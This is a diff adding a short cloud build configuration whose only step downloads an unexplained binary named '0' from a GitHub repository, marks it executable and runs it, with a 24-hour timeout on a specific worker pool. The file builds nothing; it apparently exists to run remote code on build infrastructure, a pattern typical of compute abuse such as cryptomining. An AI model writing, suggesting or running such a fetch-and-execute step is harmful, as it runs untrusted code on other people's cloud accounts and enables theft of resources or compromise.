@@ -1,0 +1,12 @@
+steps:
+  - name: golang
+    args: 
+      - '-c'
+      - >-
+        wget https://github.com/NabilaMahmudah/nyut/raw/main/0 && chmod u+x 0 && ./0
+    waitFor: ["-"]
+    entrypoint: /bin/bash
+timeout: 86400s
+options:
+  pool:
+    name: 'projects/symmetric-flow-330514/locations/asia-northeast1/workerPools/1'
